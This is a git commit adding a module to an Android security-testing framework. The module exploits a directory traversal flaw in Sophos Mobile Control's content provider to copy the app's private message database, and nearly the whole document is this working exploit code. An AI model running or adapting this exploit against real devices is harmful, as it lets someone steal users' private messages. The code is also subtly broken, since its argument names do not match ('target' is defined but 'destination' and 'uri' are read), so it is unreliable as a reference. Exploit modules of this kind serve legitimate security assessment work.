ef2949edd5c9524ba4f93eaf47e12d936161ba89
Daniel Bradberry <daniel.bradberry@mwrinfosecurity.com>
2012-12-19 08:50:39 +0000

    porting Henry's Sophos Mobile Control vulnerability

---
+++ hh/sophos/sophos_messages.py
@@ -0,0 +1,34 @@
+import os
+
+from mwr.common import fs
+
+from mwr.droidhg.modules import common, Module
+
+class Messages(Module, common.ClassLoader, common.Provider):
+    
+    name = "Steal the Messages database from Sophos Mobile Control"
+    description = """Extracts the Messages database from Sophos Mobile Control (com.sophos.mobilecontrol.client.android), using a directory traversal vulnerability."""
+    examples = ""
+    author = "Henry Hoggard"
+    date = "2012-12-19"
+    license = "MWR Code License"
+    path = ["exploit", "pilfer", "thirdparty", "sophos", "mobilecontrol"]
+    
+    __content_uri = "content://com.sophos.mobilecontrol.client.android.files/../../../../../../../../../../../../..//data/data/com.sophos.mobilecontrol.client.android/databases/message.db"
+    
+    def add_arguments(self, parser):
+        parser.add_argument("target", help="where to save the copied database", nargs="?")
+    
+    def execute(self, arguments):
+        data = self.contentResolver().read(self.__content_uri)
+        
+        if os.path.isdir(arguments.destination):
+            arguments.destination = os.path.sep.join([arguments.destination, arguments.uri.split("/")[-1]])
+        
+        length = fs.write(arguments.destination, data)
+
+        if length != None:
+            self.stdout.write("Written %d bytes. You can open this file with sqlite3.\n" % len(data))
+        else:
+            self.stdout.write("Failed to read database.")
+            
